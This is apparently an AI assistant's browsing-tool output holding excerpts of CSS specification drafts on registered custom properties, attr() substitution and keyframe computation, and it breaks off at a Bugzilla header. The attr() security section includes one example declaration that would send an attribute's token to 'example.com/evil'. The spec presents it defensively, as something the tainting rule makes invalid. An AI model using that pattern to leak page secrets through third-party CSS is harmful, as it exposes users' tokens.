"CSS Properties and Values API Level 1 (https://drafts.css-houdini.org/css-properties-values-api-1/)\nciteturn1260view0 [wordlim: 200] Crawled: today; Content type: text/html; Source: open({\"ref_id\":\"https://drafts.css-houdini.org/css-properties-values-api-1/\",\"lineno\":140}); Total lines: 1339\nL133: This works fine if the syntax of a property never changes over the lifetime of a page. If a custom property is registered, however, it can change its syntax, so that a property that was previously invalid suddenly becomes valid.\nL134: The only ways to handle this are to either store every declaration, even those that were initially invalid (increasing the memory cost of pages), or to re-parse the entire page’s CSS with the new syntax rules (increasing the processing cost of registering a custom property). Neither of these are very desirable.\nL135: Further, UA-defined properties have their syntax determined by the version of the UA the user is viewing the page with; this is out of the page author’s control, which is the entire reason for CSS’s error-recovery behavior and the practice of writing multiple declarations for varying levels of support. A custom property, on the other hand, has its syntax controlled by the page author, according to whatever stylesheet or script they’ve included in the page; there’s no unpredictability to be managed.\nL136: Throwing away syntax-violating custom properties would thus only be, at best, a convenience for the page author, not a necessity like for UA-defined properties.\nL137: ### 2.3. cite90†Specified Value†drafts.csswg.org -Time Behavior\nL138: \nL139: Just like unregistered cite77†custom properties†drafts.csswg.org , all cite81†registered custom properties , regardless of registered syntax, accept the cite91†CSS-wide keywords†drafts.csswg.org , such as cite92†inherit†drafts.csswg.org or cite93†revert†drafts.csswg.org . Their behavior is defined in cite94†CSS Cascading 4 § 7.3 Explicit Defaulting†drafts.csswg.org .\nL140: ### 2.4. cite95†Computed Value†drafts.csswg.org -Time Behavior\nL141: \nL142: The cite95†computed value†drafts.csswg.org of a cite81†registered custom property is determined by the syntax of its cite96†registration .\nL143: \nL144: If the cite96†registration’s syntax is the cite97†universal syntax definition , the cite95†computed value†drafts.csswg.org is the same as for unregistered cite77†custom properties†drafts.csswg.org (either the specified value with variables substituted, or the cite87†guaranteed-invalid value†drafts.csswg.org ).\nL145: Otherwise, attempt to cite86†parse†drafts.csswg.org the property’s value according to its registered syntax. If this fails, the declaration is cite98†invalid at computed-value time†drafts.csswg.org and the cite95†computed value†drafts.csswg.org is determined accordingly. If it succeeds, the cite95†computed value†drafts.csswg.org depends on the specifics of the syntax:\nL146: \nL147: For `\"<length>\"`, `\"<length-percentage>\"`, `\"<angle>\"`, `\"<time>\"`, `\"<resolution>\"`, `\"<integer>\"`, `\"<number>\"`, and `\"<percentage>\"` values:\nL148:   * If the specified value is a cite99†dimension†drafts.csswg.org literal (such as 50em or .2s), the computed value is the same value, but with the unit converted to the corresponding cite100†canonical unit†drafts.csswg.org for the type of value.\nL149: \nL150:   * If the specified value is any other numeric literal (such as 5 or 20%), the computed value is as specified. (In particular, percentages are never resolved against anything.)\nL151:   * If the specified value is a function that evaluates to one of those types (such as a cite101†math function†drafts.csswg.org ), the computed value is defined by that function.\nL152: \nL153: For `\"<string>\"` values, the computed value is as specified.\nL154: \nL155: For `\"<color>\"` values, the value is computed by resolving color values, per cite102†CSS Color 4 §  15. Resolving <color> Values†drafts.csswg.org .\nL156: \nL157: For `\"<custom-ident>\"`, ident, or `\"*\"` values, the computed value is as specified.\nL158: For `\"<url>\"` values, the computed value is one of the following:\nL159: \nL160:   * if the URL is a relative URL, the computed value is the resolved absolute URL as described in cite103†[css3-values] .\nL161: \nL162:   * otherwise, the computed value is as specified.\nL163: \nL164: URL behavior examples\nL165: \nL166: Because URLs resolve against the base URL of the stylesheet they appear in, we can end up with multiple relative URLs that resolve against different base URLs, even though they appear in the same property.\nL167: For example, suppose --url-foo and --url-bar are registered custom properties with <url> syntax, and that we have a stylesheet at `/style/foo/foo.css`:\nL168: \nL169:     div {\nL170:       --url-foo: url(\"foo.png\");\nL171:     }\nL172: \nL173: \nL174: and another stylesheet at `/style/bar/bar.css`\nL175: \nL176:     div {\nL177:       --url-bar: url(\"bar.png\");\nL178:     }\nL179: and finally a document at `/index.html`:\nL180: \nL181:     <link href=\"/style/foo/foo.css\" rel=\"stylesheet\" type=\"text/css\">\nL182:     <link href=\"/style/bar/bar.css\" rel=\"stylesheet\" type=\"text/css\">\nL183:     <div style=\"background-image: var(--url-foo), var(--url-bar);\">\nL184:     </div>\nL185: \nL186: \nL187: Here, the var(--url-foo) reference would produce a URL that resolves against `/style/foo`, and the var(--url-bar) reference would produce a URL that resolves against `/style/bar`.\nL188: On the other hand, if both --url-foo and --url-bar were unregistered, they would substitute their literal values (relative URLs) into the `/index.html` stylesheet, which would then resolve the URLs against `/index.html` instead.\nL189: \nL190: For `\"<image>\"` values, the computed value is the cite104†computed <image>†drafts.csswg.org .\nL191: \nL192: For `\"<transform-function>\"` and `\"<transform-list>\"` values, the computed value is as specified but with all lengths resolved to their computed values.\nL193: For values with cite40†multipliers , the computed value is a list of the computed values of the base type.\nL194: \nL195: For syntaxes specified with cite41†the | combinator , the computed value is given by applying the computed-value rules for the first clause that matches the value.\nL196: ### 2.5. Animation Behavior\nL197: \nL198: Note: As defined by cite105†[css3-animations] and cite106†[css3-transitions] , it is possible to specify animations and transitions that reference custom properties.\nL199: \nL200: When referenced by animations and transitions, custom property values cite107†interpolate†drafts.csswg.org cite108†by computed value†drafts.csswg.org , in accordance with the type that they parsed as.\n--------------------------------------------------------------------------------\nCSS Values and Units Module Level 5 (https://drafts.csswg.org/css-values-5/)\nciteturn1260view1 [wordlim: 200] Crawled: today; Content type: text/html; Source: open({\"ref_id\":\"https://drafts.csswg.org/css-values-5/\",\"lineno\":1049}); Total lines: 2842\nL1013: Note: This is different from specifying a syntax of type(*), which still triggers CSS parsing (but with no requirements placed on it beyond that it parse validly), and which substitutes the result of that parsing directly as tokens, rather than as a cite156†<string> value.\nL1014: \nL1015: cite123†<declaration-value> L1016: \nL1017: \nL1018: Specifies a fallback value for the cite144†attr() , which will be substituted instead of the attribute’s value if the attribute is missing or fails to parse as the specified type.\nL1019: If the cite568†<attr-type> argument is omitted, the fallback defaults to the empty string if omitted; otherwise, it defaults to the cite175†guaranteed-invalid value if omitted.\nL1020: \nL1021: If a property contains one or more cite144†attr() functions, and those functions are syntactically valid, the entire property’s grammar must be assumed to be valid at parse time. It is only syntax-checked at computed-value time, after attr() functions have been cite177†substituted .\nL1022: Note that the default value need not be of the type given. For instance, if the type required of the attribute by the author is <length>, the default could still be auto, like in cite696†width: attr(size <length>, auto); .\nL1023: This example shows the use of attr() to visually illustrate data in an XML file:\nL1024: \nL1025:     <stock>\nL1026:       <wood length=\"12\"/>\nL1027:       <wood length=\"5\"/>\nL1028:       <metal length=\"19\"/>\nL1029:       <wood length=\"4\"/>\nL1030:     </stock>\nL1031: \nL1032:     stock::before {\nL1033:       display: block;\nL1034:       content: \"To scale, the lengths of materials in stock are:\";\nL1035:     }\nL1036:     stock > * {\nL1037:       display: block;\nL1038:       width: attr(length em, 0px);\nL1039:       height: 1em;\nL1040:       border: solid thin;\nL1041:       margin: 0.5em;\nL1042:     }\nL1043:     wood {\nL1044:       background: orange url(wood.png);\nL1045:     }\nL1046:     metal {\nL1047:       background: silver url(metal.png);\nL1048:     }\nL1049: #### 8.7.1. Substitution\nL1050: \nL1051: cite144†attr() is an cite132†arbitrary substitution function , similar to cite133†var() , and so is replaced with the value it represents (if possible) at cite179†computed value time; otherwise, it’s replaced with the cite175†guaranteed-invalid value , which will make its declaration cite492†invalid at computed-value time .\nL1052: \nL1053: To cite531†replace an attr() function , given a list of `arguments`:\nL1054:   1. Let `el` be the element that the style containing the cite144†attr() function is being applied to. Let `first arg` be the first cite123†<declaration-value> in `arguments`. Let `second arg` be the <declaration-value>? passed after the comma, or null if there was no comma.\nL1055:   2. cite177†Substitute arbitrary substitution functions in `first arg`, then cite166†parse it as cite567†<attr-name> cite568†<attr-type> ?. If that returns failure, jump to the last step (labeled FAILURE). Otherwise, let `attr name` and `syntax` be the results of parsing (with `syntax` being null if cite568†<attr-type> was omitted), processed as specified in the definition of those arguments.\nL1056:   3. If `attr name` exists as an attribute on `el`, let `attr value` be its value; otherwise jump to the last step (labeled FAILURE).\nL1057: \nL1058:   4. If `syntax` is the keyword number or an cite570†<attr-unit> value, parse `attr value` against cite568†<attr-type> . If that succeeds, return the result; otherwise, jump to the last step (labeled FAILURE).\nL1059: \nL1060: Note: No parsing or modification of any kind is performed on the value.\nL1061:   5. If `syntax` is null or the keyword raw-string, return a CSS cite156†<string> whose value is `attr value`.\nL1062: \nL1063: Note: No parsing or modification of any kind is performed on the value.\nL1064: \nL1065:   6. cite177†Substitute arbitrary substitution functions in `attr value`, with «\"attribute\", `attr name`» as the cite535†substitution context , then cite172†parse with a <syntax> `attr value`, with `syntax` and `el`. If that succeeds, return the result; otherwise, jump to the last step (labeled FAILURE).\nL1066: \nL1067:   7. FAILURE:\nL1068:     1. If `second arg` is null, and `syntax` was omitted, return an empty CSS cite156†<string> .\nL1069: \nL1070:     2. If `second arg` is null, return the cite175†guaranteed-invalid value .\nL1071: \nL1072:     3. cite177†Substitute arbitrary substitution functions in `second arg`, and return the result.\nL1073: #### 8.7.2. Security\nL1074: \nL1075: Tests\nL1076:   * cite697†attr-security-animation.html†wpt.fyi cite698†(live test)†wpt.live cite699†(source)†github.com L1077:   * cite700†attr-security-if.html†wpt.fyi cite701†(live test)†wpt.live cite702†(source)†github.com L1078:   * cite703†attr-security-transition.html†wpt.fyi cite704†(live test)†wpt.live cite705†(source)†github.com L1079:   * cite706†attr-security.html†wpt.fyi cite707†(live test)†wpt.live cite708†(source)†github.com L1080:   * cite709†attr-security-transition-interpolated.html†wpt.fyi cite710†(live test)†wpt.live cite711†(source)†github.com L1081: An cite144†attr() function can reference attributes that were never intended by the page to be used for styling, and might contain sensitive information (for example, a security token used by scripts on the page).\nL1082: In general, this is fine. It is difficult to use cite144†attr() to extract information from a page and send it to a hostile party, in most circumstances. The exception to this is URLs. If a URL can be constructed with the value of an arbitrary attribute, purely from CSS, it can easily send any information stored in attributes to a hostile party, if 3rd-party CSS is allowed at all.\nL1083: To guard against this, the values produced by an cite144†attr() are considered attr()-tainted, as are functions that contain an cite712†attr()-tainted value.\nL1084: \nL1085: The substitution value of an cite132†arbitrary substitution function is cite712†attr()-tainted as a whole if any attr()-tainted values were involved in creating that substitution value. This extends to the cite713†equivalent token sequence†drafts.css-houdini.org when substituting values of cite145†registered custom properties†drafts.css-houdini.org .\nL1086: Using an cite712†attr()-tainted value as or in a cite180†<url> makes a declaration cite492†invalid at computed-value time .\nL1087: \nL1088: For example, all of the following are cite492†invalid at computed-value time :\nL1089: \nL1090:   * cite714†background-image: src(attr(foo)); - can’t use it directly.\nL1091: \nL1092:   * cite714†background-image: image(attr(foo)) - can’t use it in other cite180†<url> -taking functions.\nL1093: \nL1094:   * cite714†background-image: src(string(\"http://example.com/evil?token=\" attr(foo))) - can’t \"launder\" it thru another function.\n--------------------------------------------------------------------------------\nWeb Animations Module Level 1 (https://drafts.csswg.org/web-animations-1/)\nciteturn1260view2 [wordlim: 200] Crawled: today; Content type: text/html; Source: open({\"ref_id\":\"https://drafts.csswg.org/web-animations-1/\",\"lineno\":1804}); Total lines: 4503\nL1779:   2. If `keyframes` contains more than one cite379†keyframe and the cite388†computed keyframe offset of the first keyframe in `keyframes` is null, set the computed keyframe offset of the first keyframe to 0.\nL1780: \nL1781:   3. If the cite388†computed keyframe offset of the last cite379†keyframe in `keyframes` is null, set its computed keyframe offset to 1.\nL1782: \nL1783:   4. For each pair of cite379†keyframes `A` and `B` where:\nL1784: \nL1785:      * `A` appears before `B` in `keyframes`, and\nL1786:      * `A` and `B` have a cite388†computed keyframe offset that is not null, and\nL1787: \nL1788:      * all cite379†keyframes between `A` and `B` have a null cite388†computed keyframe offset ,\nL1789: \nL1790: calculate the cite388†computed keyframe offset of each cite379†keyframe between `A` and `B` as follows:\nL1791: \nL1792:     1. Let offset_{`k`} be the cite388†computed keyframe offset of a cite379†keyframe `k`.\nL1793: \nL1794:     2. Let `n` be the number of keyframes between and including `A` and `B` minus 1.\nL1795:     3. Let `index` refer to the position of `keyframe` in the sequence of keyframes between `A` and `B` such that the first keyframe after `A` has an `index` of 1.\nL1796: \nL1797:     4. Set the cite388†computed keyframe offset of `keyframe` to cite389†offset _{`A`} + (offset_{`B`} − offset_{`A`}) × `index` / `n`.\nL1798: \nL1799: Tests\nL1800:   * cite390†background-shorthand.html†wpt.fyi cite391†(live test)†wpt.live cite392†(source)†github.com L1801:   * cite393†computed-keyframes-shorthands.html†wpt.fyi cite394†(live test)†wpt.live cite395†(source)†github.com L1802:   * cite396†effect-value-context-filling.html†wpt.fyi cite397†(live test)†wpt.live cite398†(source)†github.com L1803:   * cite399†effect-value-context.html†wpt.fyi cite400†(live test)†wpt.live cite401†(source)†github.com L1804: cite402†Computed keyframes are produced using the following procedure. Note that this procedure is only performed on a cite237†keyframe effect having an cite312†effect target for which computed property values can be calculated.\nL1805: \nL1806:   1. Let `computed keyframes` be an empty list of cite379†keyframes .\nL1807: \nL1808:   2. For each `keyframe` in the list of cite379†keyframes specified on this cite237†keyframe effect , perform the following steps:\nL1809: \nL1810:     1. Add a new empty cite379†keyframe , `computed keyframe`, to `computed keyframes`.\nL1811:     2. For each property specified in `keyframe`:\nL1812: \nL1813:        * cite386†Compute a property value using the value specified on `keyframe` as the value, and the cite374†target element as the element; then add the property and resulting value to `computed keyframe`.\nL1814: \nL1815:        * For shorthand properties, add the equivalent longhand properties.\nL1816:        * For logical properties cite403†[CSS-LOGICAL-1] , add the cite404†equivalent physical properties cite405†[CSS-WRITING-MODES-4] based on the computed value of cite406†writing-mode and/or cite407†direction for the cite312†effect target .\nL1817: For example, if `keyframe` has a value of 12pt for the cite408†border-width cite409†shorthand property , the user agent will cite386†compute a property value of 16px for each of the cite410†longhand properties : cite411†border-bottom-width , cite412†border-left-width , cite413†border-right-width , and cite414†border-top-width . As a result, `computed keyframe` would not have a value for the border-width property, but would instead include each of the longhand properties, each with the value 16px.\nL1818: If conflicts arise when expanding shorthand properties or replacing logical properties with physical properties, apply the following rules in order until the conflict is resolved:\nL1819: \nL1820:       1. Longhand properties override shorthand properties (e.g. cite415†border-top-color overrides cite416†border-top ).\nL1821: \nL1822:       2. Shorthand properties with fewer longhand components override those with more longhand components (e.g. cite416†border-top overrides cite417†border-color ).\nL1823:       3. Physical properties override logical properties.\nL1824: \nL1825:       4. For shorthand properties with an equal number of longhand components, properties whose IDL name (see the cite418†CSS property to IDL attribute algorithm cite419†[CSSOM] ) appears earlier when sorted in ascending order by the Unicode codepoints that make up each IDL name, override those who appear later.\nL1826: \nL1827:   3. Apply the procedure to cite420†compute missing keyframe offsets to `computed keyframes`.\nL1828: \nL1829:   4. Return `computed keyframes`.\nL1830: #### 5.3.4. The effect value of a keyframe effect\nL1831: \nL1832: The cite378†effect value of a single property referenced by a cite237†keyframe effect as one of its cite186†target properties , for a given `iteration progress`, `iteration index` and `underlying value` is calculated as follows.\nL1833: \nL1834:   1. If `iteration progress` is cite180†unresolved abort this procedure.\nL1835: \nL1836:   2. Let `target property` be the cite410†longhand property for which the cite378†effect value is to be calculated.\nL1837:   3. If cite358†animation type of the `target property` is cite359†not animatable abort this procedure since the effect cannot be applied.\nL1838: \nL1839:   4. If the cite237†keyframe effect does not have an cite312†effect target , or if the effect target cannot have computed property values calculated, abort this procedure.\nL1840: \nL1841:   5. Let `property-specific keyframes` be the result of getting the set of cite402†computed keyframes for this cite237†keyframe effect .\nL1842:   6. Remove any cite379†keyframes from `property-specific keyframes` that do not have a property value for `target property`.\nL1843: \nL1844:   7. If `property-specific keyframes` is empty, return `underlying value`.\nL1845:   8. If there is no cite379†keyframe in `property-specific keyframes` with a cite388†computed keyframe offset of 0, create a new keyframe with a computed keyframe offset of 0, a property value set to `underlying value`, a cite382†keyframe-specific composite operation of cite421†replace , and a cite340†keyframe-specific easing function of the cite339†linear easing function , and prepend it to the beginning of `property-specific keyframes`.\nL1846:   9. Similarly, if there is no cite379†keyframe in `property-specific keyframes` with a cite388†computed keyframe offset of 1, create a new keyframe with a computed keyframe offset of 1, a property value set to `underlying value`, a cite382†keyframe-specific composite operation of cite421†replace , and a cite340†keyframe-specific easing function of the cite339†linear easing function , and append it to the end of `property-specific keyframes`.\n--------------------------------------------------------------------------------\n1883255 - Better integrate the AnimatedValue in the cascade (https://bugzilla.mozilla.org/show_bug.cgi?id=1883255)\nciteturn1260view3 [wordlim: 200] Crawled: last month; Content type: text/html; Source: open({\"ref_id\":\"https://bugzilla.mozilla.org/sho